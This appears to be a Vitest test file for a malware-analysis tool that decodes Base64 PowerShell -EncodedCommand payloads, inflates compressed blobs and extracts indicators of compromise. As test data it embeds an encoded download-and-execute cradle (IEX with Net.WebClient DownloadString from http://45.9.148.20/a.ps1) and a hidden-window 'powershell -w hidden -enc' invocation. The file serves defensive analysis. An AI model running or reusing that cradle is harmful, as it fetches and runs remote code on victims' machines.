import { describe, expect, it } from 'vitest'
import { decodeEnc, looksBase64, inflate, bytesToText } from '../fold'
import { analyze } from '../report'

// UTF-16LE bytes of "IEX 'hi'" → Base64. Precomputed so the test is deterministic.
const ENC = 'SQBFAFgAIAAnAGgAaQAnAA=='

describe('decodeEnc', () => {
  it('decodes a -EncodedCommand as Base64 → UTF-16LE (not UTF-8)', () => {
    expect(decodeEnc(ENC)).toBe("IEX 'hi'")
  })
  it('looksBase64 accepts the payload and rejects a URL', () => {
    expect(looksBase64(ENC)).toBe(true)
    expect(looksBase64('http://a/x')).toBe(false)
  })
})

// Real -enc payload: IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')
const DOWNLOAD_ENC =
  'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='

function wrapEveryNChars(s: string, n: number, sep: string): string {
  const chunks: string[] = []
  for (let i = 0; i < s.length; i += n) chunks.push(s.slice(i, i + n))
  return chunks.join(sep)
}

describe('whitespace-tolerant Base64 (line-wrapped -enc paste from EDR/Sysmon logs)', () => {
  it('decodeEnc/looksBase64 tolerate a newline-wrapped blob identically to the clean one', () => {
    const wrapped = wrapEveryNChars(DOWNLOAD_ENC, 40, '\n')
    expect(looksBase64(wrapped)).toBe(true)
    expect(decodeEnc(wrapped)).toBe(decodeEnc(DOWNLOAD_ENC))
  })

  it('decodeEnc/looksBase64 tolerate a space-wrapped blob identically to the clean one', () => {
    const wrapped = wrapEveryNChars(DOWNLOAD_ENC, 40, ' ')
    expect(looksBase64(wrapped)).toBe(true)
    expect(decodeEnc(wrapped)).toBe(decodeEnc(DOWNLOAD_ENC))
  })

  it('analyze() decodes a newline-wrapped -enc payload exactly like the clean input', async () => {
    const wrapped = wrapEveryNChars(DOWNLOAD_ENC, 40, '\n')
    const clean = await analyze('powershell -w hidden -enc ' + DOWNLOAD_ENC)
    const r = await analyze('powershell -w hidden -enc ' + wrapped)

    const layer = r.layers.find((l) => l.transform === 'Base64 → UTF-16LE')
    expect(layer?.state).toBe('fully-decoded')
    expect(layer?.text).toBe(clean.layers.find((l) => l.transform === 'Base64 → UTF-16LE')!.text)
    expect(r.iocs.map((i) => i.raw)).toContain('http://45.9.148.20/a.ps1')
  })

  it('analyze() decodes a space-wrapped -enc payload exactly like the clean input', async () => {
    const wrapped = wrapEveryNChars(DOWNLOAD_ENC, 40, ' ')
    const r = await analyze('powershell -w hidden -enc ' + wrapped)

    const layer = r.layers.find((l) => l.transform === 'Base64 → UTF-16LE')
    expect(layer?.state).toBe('fully-decoded')
    expect(r.iocs.map((i) => i.raw)).toContain('http://45.9.148.20/a.ps1')
  })
})

async function deflateRaw(text: string): Promise<Uint8Array> {
  const cs = new CompressionStream('deflate-raw')
  const stream = new Blob([new TextEncoder().encode(text)]).stream().pipeThrough(cs)
  return new Uint8Array(await new Response(stream).arrayBuffer())
}
async function gzip(text: string): Promise<Uint8Array> {
  const cs = new CompressionStream('gzip')
  const stream = new Blob([new TextEncoder().encode(text)]).stream().pipeThrough(cs)
  return new Uint8Array(await new Response(stream).arrayBuffer())
}

describe('inflate', () => {
  it('inflates a raw-DEFLATE blob (PowerShell DeflateStream)', async () => {
    const out = await inflate(await deflateRaw("IEX 'payload'"))
    expect(out).not.toBeNull()
    expect(bytesToText(out!)).toBe("IEX 'payload'")
  })
  it('inflates a gzip blob (detected by magic bytes)', async () => {
    const out = await inflate(await gzip('hello gzip'))
    expect(bytesToText(out!)).toBe('hello gzip')
  })
  it('returns null for non-compressed bytes', async () => {
    expect(await inflate(new TextEncoder().encode('not compressed'))).toBeNull()
  })
})
